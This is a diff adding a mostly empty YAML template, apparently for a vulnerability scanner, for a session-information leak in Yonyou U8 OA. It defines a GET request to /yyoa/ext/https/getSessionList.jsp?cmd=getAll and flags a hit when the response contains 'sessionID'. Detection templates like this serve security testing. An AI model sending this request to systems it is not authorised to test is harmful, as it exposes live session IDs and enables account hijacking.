@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 用友U8 getSessionList.jsp 敏感信息泄漏
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+  headers:
+response1:
+  headers:
+  body: sessionID
+  code:
+requests2:
+response2:
